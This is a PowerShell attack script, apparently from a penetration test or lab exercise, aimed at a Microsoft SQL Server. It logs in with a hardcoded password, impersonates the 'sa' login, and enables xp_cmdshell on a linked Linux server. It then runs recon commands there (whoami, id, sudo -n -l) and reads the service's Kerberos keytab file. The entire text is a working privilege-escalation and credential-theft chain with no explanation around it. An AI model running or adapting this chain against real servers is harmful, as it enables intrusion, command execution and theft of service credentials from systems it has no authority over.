# Branch D: enable xp_cmdshell (sysadmin on linux01) + exec recon
$ErrorActionPreference = "Continue"
Add-Type -AssemblyName System.Data
$connStr = "Server=192.168.77.22;Database=master;Integrated Security=false;User ID=analyst_t1;Password=T13r_An@lyst!;TrustServerCertificate=True;"
$conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
$conn.Open()
Write-Output "SQL_OK: connected to mbr01 as analyst_t1"

function Invoke-Reader($sql) {
  $c = $conn.CreateCommand()
  $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
  $r = $c.ExecuteReader()
  while ($r.Read()) { for ($i=0; $i -lt $r.FieldCount; $i++) { if (-not $r.IsDBNull($i)) { Write-Output $r.GetValue($i) } } }
  $r.Close()
}
function Invoke-NoQuery($sql) {
  $c = $conn.CreateCommand()
  $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
  $c.ExecuteNonQuery() | Out-Null
}

Write-Output "=== enable xp_cmdshell (sa on linux01) ==="
try {
  Invoke-NoQuery "EXEC ('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE WITH OVERRIDE') AT LINUX01;"
  Invoke-NoQuery "EXEC ('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE WITH OVERRIDE') AT LINUX01;"
  Write-Output "ENABLE_OK"
} catch { Write-Output "enable err: $($_.Exception.Message)" }

Write-Output "=== confirm xp_cmdshell value ==="
try {
  Invoke-Reader "EXEC ('SELECT value_in_use FROM sys.configurations WHERE name = ''xp_cmdshell''') AT LINUX01;"
} catch { Write-Output "cfg err: $($_.Exception.Message)" }

Write-Output "=== whoami on linux01 ==="
try { Invoke-Reader "EXEC ('exec master..xp_cmdshell ''whoami''') AT LINUX01;" } catch { Write-Output "whoami err: $($_.Exception.Message)" }

Write-Output "=== id + groups (mssql escalation context) ==="
try { Invoke-Reader "EXEC ('exec master..xp_cmdshell ''id && groups''') AT LINUX01;" } catch { Write-Output "id err: $($_.Exception.Message)" }

Write-Output "=== sudo -l (passwordless?) ==="
try { Invoke-Reader "EXEC ('exec master..xp_cmdshell ''sudo -n -l 2>&1''') AT LINUX01;" } catch { Write-Output "sudo err: $($_.Exception.Message)" }

Write-Output "=== mssql keytab (WT046) ==="
try { Invoke-Reader "EXEC ('exec master..xp_cmdshell ''cat /var/opt/mssql/secrets/mssql.keytab''') AT LINUX01;" } catch { Write-Output "keytab err: $($_.Exception.Message)" }

Write-Output "=== podman available? ==="
try { Invoke-Reader "EXEC ('exec master..xp_cmdshell ''which podman && podman ps 2>&1''') AT LINUX01;" } catch { Write-Output "podman err: $($_.Exception.Message)" }

$conn.Close()
Write-Output "=== BRANCHD_EXEC2_DONE ==="
